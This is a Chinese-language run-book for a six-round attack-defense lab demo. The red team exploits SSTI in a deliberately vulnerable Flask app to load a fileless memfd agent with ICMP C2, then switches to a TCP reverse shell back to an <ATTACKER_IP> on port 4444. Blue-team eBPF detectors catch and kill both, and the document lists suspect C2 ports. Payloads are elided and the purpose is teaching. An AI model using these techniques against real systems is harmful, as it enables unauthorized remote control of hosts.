# Attack-Defense Demo Flow — 6 回合攻防演練腳本

> 本文件為完整的 Demo 執行腳本，所有組員照著跑即可。
> 每回合約 2-3 分鐘，全程約 15-20 分鐘。

---

## 環境需求

| 項目 | 說明 |
|------|------|
| 終端數量 | **4 個**（建議用 tmux 或分割視窗） |
| 作業系統 | Ubuntu 22.04+ (WSL2 or VM)，kernel >= 5.3 |
| Root 權限 | 靶機 + 藍軍需要 sudo |
| 套件 | python3, flask, bpfcc-tools, python3-bpfcc, linux-headers, nmap |

### 終端配置

| 終端 | 角色 | 顏色建議 |
|------|------|----------|
| **T1** | 靶機 (Target) | 白色 |
| **T2** | 藍軍 (Blue Team) | 藍色 |
| **T3** | 紅軍 C2 / Listener | 紅色 |
| **T4** | 紅軍攻擊指令 | 黃色 |

### 變數替換

在以下所有指令中，替換這些值：

```
<TARGET_IP>   = 靶機 IP（例如 100.103.146.70）
<ATTACKER_IP> = 攻擊機 IP（你的 WSL2 IP）
```

---

## 事前準備

```bash
# 安裝環境（只需執行一次）
cd ~/cybersecurity
bash setup_env.sh
```

---

## 回合 1 — 偵察 (Reconnaissance)

**目的**：展示紅方如何發現目標服務

### T1 — 啟動靶機

```bash
sudo python3 target/target_app.py
```

預期輸出：
```
=======================================================
  Diagnostic API | 0.0.0.0:9999
  SSTI Vuln on /diag  (render_template_string + f-string)
=======================================================
```

### T4 — 紅方偵察

```bash
bash red_team/recon.sh <TARGET_IP>
```

預期輸出（重點）：
```
PORT     STATE SERVICE
9999/tcp open  abyss
```

### 講解要點

- nmap 掃描發現 port 9999 開放
- 服務識別為 Diagnostic API
- MITRE ATT&CK: **T1595** (Active Scanning)

---

## 回合 2 — 紅方攻擊成功（藍方 OFF）

**目的**：展示完整 Kill Chain — SSTI → Fileless Agent → ICMP C2

### T3 — 啟動紅方 C2 Server

```bash
sudo python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
```

預期輸出：
```
+====================================================+
|     Red Team  Fileless ICMP C2  v1.0               |
+====================================================+
  Target : <TARGET_IP>
  C2 IP  : <ATTACKER_IP>

[*] SSTI attack command (paste into another terminal):

  curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."

[*] Waiting for agent beacon...
```

### T4 — 發動攻擊

複製 T3 輸出的 curl 指令，貼上執行：

```bash
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
```

### T3 — 確認 C2 連線

預期輸出：
```
[+] Agent beacon  <TARGET_IP>
    Host=target-machine  UID=0  Kernel=6.8.0-106-generic
```

在 C2 prompt 輸入指令展示控制：

```
C2> whoami
root

C2> id
uid=0(root) gid=0(root)

C2> cat /etc/hostname
target-machine
```

### 講解要點

- **SSTI**：Flask f-string + render_template_string 漏洞
- **Fileless Execution**：memfd_create 在記憶體中建立匿名 fd，不寫入磁碟
- **ICMP Covert C2**：指令透過 ICMP echo request payload 傳輸，XOR 加密
- 藍方完全沒有察覺（沒有任何偵測機制運行）
- MITRE ATT&CK: **T1190, T1059.006, T1620, T1027, T1095**

---

## 回合 3 — 藍方上線，發現並清除威脅

**目的**：展示 eBPF 冷啟動掃描能發現已存在的記憶體惡意程式

### T2 — 啟動藍方 eBPF MDR v1

```bash
sudo python3 blue_team/blue_ebpf_mdr.py --kill
```

預期輸出：
```
+====================================================+
|   Blue Team  eBPF MDR Engine  v1.0                 |
+====================================================+
  Auto-kill : ENABLED

  [!] Found 1 existing memfd process(es):
      PID=12345  COMM=python3  EXE=/memfd: (deleted)
        -> KILLED
```

### T3 — 觀察 Agent 斷線

C2 prompt 輸入指令，預期 timeout：

```
C2> whoami
[timeout — no response from agent]
```

### 講解要點

- 藍方即使**晚於**紅方上線，仍能透過 `/proc/*/exe` 掃描找到 memfd 進程
- `bpf_send_signal(SIGKILL)` 在 kernel 層直接殺死進程
- 冷啟動掃描 = 補償偵測（彌補 eBPF 只能偵測新事件的限制）

---

## 回合 4 — 紅方再次攻擊 → 即時攔截

**目的**：展示 eBPF 即時偵測與阻斷能力

### T4 — 紅方再次攻擊

再次貼上同一個 curl 指令：

```bash
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
```

### T2 — 觀察藍方偵測

預期輸出：
```
TIME       EVENT            SEVERITY      PID      PPID     UID    COMM             ACT        DETAIL
─────────────────────────────────────────────────────────────────────────────────────────────────────
14:30:01   MEMFD_CREATE     HIGH          23456    23400    0      python3          KILLED
```

### T3 — 確認攻擊失敗

C2 不會收到任何 beacon — 因為進程在 memfd_create 執行前就被殺死。

### 講解要點

- `sys_enter_memfd_create` tracepoint 在 syscall **進入時**觸發（尚未執行）
- `bpf_send_signal(9)` 在 kernel 空間直接送出 SIGKILL，沒有 race condition
- 攻擊鏈在**最早階段**（Phase 2 Weaponization）就被截斷
- MITRE ATT&CK Detection: **T1620**

---

## 回合 5 — 紅方換招繞過 eBPF v1

**目的**：展示攻防是持續對抗 — v1 防禦有盲區

### T2 — 保持 v1 運行中（不要關閉）

### T3 — 切換到 Reverse Shell 攻擊

先 Ctrl+C 關閉舊的 C2 server，然後啟動新的：

```bash
python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
```

> 注意：這個工具**不需要 sudo**（用 TCP 不用 ICMP raw socket）

預期輸出：
```
+====================================================+
|  Red Team  Reverse Shell  v2.0                     |
|  eBPF v1 Bypass — No memfd_create                  |
+====================================================+
  Target : <TARGET_IP>:9999
  Lhost  : <ATTACKER_IP>:4444
  Method : SSTI → fork → connect → dup2 → pty.spawn
  Bypass : No memfd_create, no ICMP, no raw socket

[*] SSTI attack command (paste into another terminal):

  curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."

[*] Listening on 0.0.0.0:4444...
```

### T4 — 發動新攻擊

複製 T3 輸出的新 curl 指令，貼上執行。

### T3 — 確認攻擊成功

預期輸出：
```
[+] Reverse shell from <TARGET_IP>:xxxxx
[*] Interactive shell — type 'exit' to quit

target-machine:~$
```

在 shell 中展示控制：
```bash
whoami
id
ls /
```

### T2 — 觀察藍方 v1 完全沒反應

eBPF v1 的 console **沒有任何新的警報**。

### 講解要點

- 紅方發現 v1 只偵測 `memfd_create`、`/proc/fd execve`、`SOCK_RAW`
- 改用普通 TCP 反向 Shell：`socket(SOCK_STREAM)` → `connect()` → `dup2()` → `pty.spawn()`
- 這些全是合法 syscall，v1 沒有 hook → 完全繞過
- **教訓**：沒有一勞永逸的防禦，攻擊者會適應
- MITRE ATT&CK: **T1059.006** (新手法)

---

## 回合 6 — 藍方升級偵測 → 再次攔截

**目的**：展示防禦方也能升級，形成攻防迭代

### T3 — 先結束 Reverse Shell

在 shell 中輸入 `exit`。

### T2 — 升級到 eBPF MDR v2

Ctrl+C 關閉 v1，啟動 v2：

```bash
sudo python3 blue_team/blue_ebpf_mdr_v2.py --kill
```

預期輸出：
```
+====================================================+
|   Blue Team  eBPF MDR Engine  v2.0                 |
|   + Reverse Shell & Suspect Port Detection         |
+====================================================+
  Auto-kill : ENABLED
  Suspect   : [4444, 4445, 5555, 1234, 1337]

[*] Compiling & loading eBPF probes...
    tracepoint/syscalls/sys_enter_memfd_create  OK
    tracepoint/syscalls/sys_enter_execve        OK
    tracepoint/syscalls/sys_enter_socket         OK
    tracepoint/syscalls/sys_enter_connect        OK  [v2 NEW]
    tracepoint/syscalls/sys_enter_dup2           OK  [v2 NEW]
    tracepoint/syscalls/sys_enter_dup3           OK  [v2 NEW]
```

### T3 — 再次啟動 Reverse Shell

```bash
python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
```

### T4 — 再次攻擊

貼上 reverse shell 的 curl 指令。

### T2 — 觀察 v2 偵測

預期輸出：
```
TIME       EVENT              SEVERITY      PID      PPID     UID    COMM             ACT        DETAIL
──────────────────────────────────────────────────────────────────────────────────────────────────────────
14:35:01   SUSPECT_CONNECT    CRITICAL      34567    34500    0      python3          KILLED     connect → <ATTACKER_IP>:4444
    ╰─▶ SUSPECT PORT: PID 34567 connecting to known C2 port 4444
```

### T3 — 確認攻擊被攔截

Listener 不會收到連線（進程在 connect() 前被殺）。

### 講解要點

- v2 新增了 `sys_enter_connect` hook — 監控外連到可疑 port 的 TCP 連線
- v2 新增了 `sys_enter_dup2` / `dup3` hook — 偵測 fd 0/1/2 全部被重導向的 reverse shell 模式
- 即使紅方用普通 port（如 80/443），dup2 偵測仍能攔截
- **結論**：攻防是持續的迭代過程，沒有一方能永遠佔上風

---

## 結尾總結

### 攻防時間線

```
回合 1   回合 2         回合 3         回合 4         回合 5         回合 6
偵察  →  紅方攻擊成功 → 藍方清除威脅 → 紅方再攻被擋 → 紅方繞過v1   → 藍方升級v2攔截
nmap     SSTI+memfd     cold-start     eBPF kill      reverse shell  connect hook
         ICMP C2        /proc scan     memfd blocked   TCP bypass     port detect
```

### Kill Chain 覆蓋

| Phase | 技術 | 紅方工具 | 藍方偵測 |
|-------|------|----------|----------|
| 1 Recon | nmap 掃描 | `recon.sh` | — |
| 2 Weaponize | memfd_create 無檔案 | `red_attacker.py` | `memfd_create` hook |
| 3 Deliver | SSTI 注入 | curl POST | — |
| 4 Exploit | fork + execve | (embedded) | `execve /proc/fd` hook |
| 5 Install | in-memory agent | (embedded) | cold-start `/proc` scan |
| 6 C2 | ICMP covert channel | (embedded) | `socket(RAW)` hook |
| 5b Evasion | TCP reverse shell | `red_reverse_shell.py` | `connect` + `dup2` hook (v2) |

### MITRE ATT&CK 覆蓋總表

**攻擊技術：**

| ID | 技術 | 實作 |
|----|------|------|
| T1595 | Active Scanning | nmap recon |
| T1190 | Exploit Public-Facing App | SSTI injection |
| T1059.006 | Python Execution | memfd loader + reverse shell |
| T1620 | Reflective Code Loading | memfd_create → execve |
| T1027 | Obfuscation | Double Base64 + XOR |
| T1095 | Non-App Layer Protocol | ICMP covert C2 |
| T1071.001 | Application Layer Protocol | TCP reverse shell |

**偵測覆蓋：**

| ID | 偵測點 | Hook | 版本 |
|----|--------|------|------|
| T1620 | Reflective Loading | `sys_enter_memfd_create` | v1 |
| T1059 | Execution from /proc/fd | `sys_enter_execve` | v1 |
| T1095 | Raw ICMP Socket | `sys_enter_socket` | v1 |
| T1071.001 | Suspect Port Connect | `sys_enter_connect` | v2 |
| T1059.006 | Reverse Shell Pattern | `sys_enter_dup2/dup3` | v2 |

---

## 故障排除

| 問題 | 解決方案 |
|------|----------|
| eBPF 載入失敗 | `sudo apt install bpfcc-tools python3-bpfcc linux-headers-$(uname -r)` |
| Flask 啟動失敗 | `pip3 install flask` |
| nmap 權限不足 | `sudo bash red_team/recon.sh` |
| C2 收不到 beacon | 確認防火牆允許 ICMP，兩機器能互 ping |
| Reverse shell 連不上 | 確認防火牆允許 TCP 4444，attacker IP 正確 |
| eBPF v2 誤殺合法進程 | 用 `--whitelist PID1,PID2` 排除 |
